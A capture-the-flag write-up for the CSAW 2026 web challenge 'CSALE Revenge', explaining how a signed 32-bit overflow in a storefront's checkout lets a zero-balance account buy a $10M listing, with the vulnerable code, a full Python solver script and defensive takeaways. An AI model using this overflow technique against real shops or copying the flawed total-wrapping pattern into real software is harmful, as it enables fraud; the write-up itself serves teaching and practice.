# CSALE Revenge

| Event | Category | Flag format | Flag |
|---|---|---|---|
| CSAW CTF Finals 2026 | Web | `csawctf{...}` | `csawctf{REDACTED}` |

**TL;DR** — The correctly-deployed version of the [CSALE](../csale/) storefront. The Python
source is byte-identical to the pulled beta; only the deployment differed, and that difference
was what made the intended path unsolvable the first time. The intended bug is a **signed 32-bit
integer overflow in the checkout math**: buy three copies of a $10,000,000 listing and the cart
total wraps negative, sailing past both balance checks. The order's fulfillment note carries
the flag.

> **Flag redaction.** Published originally with the flag redacted, and no local copy of the real
> value survives, so `csawctf{REDACTED}` is kept rather than invented. The vulnerability
> analysis below is the live solve.

---

## 1. The vulnerability

Checkout computes the cart total through a `signed_32()` helper:

```python
def signed_32(value):
    value &= 0xFFFFFFFF
    return value - 0x100000000 if value & 0x80000000 else value

# in checkout():
total = signed_32(sum(x["price_cents"] * x["quantity"] for x in items))
```

Python integers are arbitrary precision, so this helper exists *only* to reintroduce a C-style
overflow that the language had already eliminated. That is the whole bug.

Listing 9 is titled "Flag", sold by `superdiscreteflaguser` for:

```
$10,000,000  ->  1,000,000,000 cents
```

`add_to_cart` clamps quantity at 25, but quantity **3** is already enough:

```
3 × 1,000,000,000 = 3,000,000,000
3,000,000,000 > 2,147,483,648  (2^31)
signed_32(3,000,000,000) = -1,294,967,296
```

### Why both guards fail

```python
if total > balance or balance - total < 0:
    return redirect("/cart?error=funds")
```

On a fresh account with a $0 balance:

- `-1,294,967,296 > 0` → **False**
- `0 - (-1,294,967,296) < 0` → `1,294,967,296 < 0` → **False**

Neither guard trips, so checkout succeeds. The second condition was clearly written as a
belt-and-braces check against exactly this class of bug, but subtracting a negative total makes
the balance *grow*, so it passes too.

The order snapshot then copies the listing's `fulfillment_note` — which contains the flag.

---

## 2. Exploit

```python
#!/usr/bin/env python3
# solve.py — CSALE Revenge: signed 32-bit overflow in checkout().
#
# Buys a $10M flag listing with a $0 balance; the flag lands in the order detail page.
import sys
import re
import html
import secrets
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"


def main():
    s = requests.Session()
    s.headers["User-Agent"] = "Mozilla/5.0"

    username = "t" + secrets.token_hex(4)
    password = "Passw0rd!123"

    print(f"[*] signing up {username}")
    s.post(f"{BASE}/signup", data={"username": username, "password": password}, timeout=20)

    print("[*] adding listing 9 x3 to cart")
    s.post(f"{BASE}/cart/items", data={"listing_id": 9, "quantity": 3}, timeout=20)

    r = s.get(f"{BASE}/cart", timeout=20)
    print("[*] cart total shown:", re.findall(r'\$[\d,\.\-]+', re.sub(r'<[^>]+>', ' ', r.text))[:6])

    print("[*] checking out")
    r = s.post(f"{BASE}/cart/checkout", timeout=30, allow_redirects=False)
    print(f"    -> {r.status_code} {r.headers.get('Location')}")

    r = s.get(f"{BASE}/account/orders", timeout=20)
    order_ids = sorted(set(int(x) for x in re.findall(r'/orders/(\d+)', r.text)))
    print(f"[*] orders: {order_ids}")

    for oid in order_ids:
        d = s.get(f"{BASE}/orders/{oid}", timeout=20).text
        txt = html.unescape(re.sub(r'\s+', ' ', re.sub(r'<[^>]+>', ' ', d)))
        m = re.search(r'csawctf\{[^}]*\}', txt)
        print(f"[{'+' if m else '-'}] order {oid}: {m.group(0) if m else 'no flag found'}")


if __name__ == "__main__":
    main()
```

No authentication bypass, no race, no payload — just a quantity of 3.

---

## 3. A second bug that does not matter

The challenge bundle also contains an access-control issue:

- `/<slug>/preview` and the GET side of `/<slug>/unlock` do not check ownership.
- `draft_file()` searches `PRIVATE_LISTING_IMAGE_DIR`, which holds the otherwise-unreachable
  `FLAG_IMAGE_PATH`.

In practice it is unexploitable: draft slugs are private and no route lists another user's
drafts, so there is no way to learn a slug to request. Worth documenting, not worth chasing —
the integer overflow is the intended and reliable path.

---

## Flag

```
csawctf{REDACTED}
```

---

## Takeaways

- **Re-deriving C semantics in a memory-safe language reintroduces C bugs.** `signed_32()` adds
  nothing a cart total needs; it only creates a wrap point.
- **Two independent balance checks are not two checks** if both are expressed in terms of the
  same attacker-controlled signed value. Validate the *inputs* (price and quantity ranges) rather
  than the derived total.
- **A quantity clamp of 25 felt like a defence** and was the only control standing between the
  user and the overflow — but the price alone was large enough that 3 sufficed.
- When a challenge ships as "Revenge", diff the deployment, not just the source. Here the source
  was byte-identical.

## Files

- `solve.py` — full solver for the integer-overflow path.
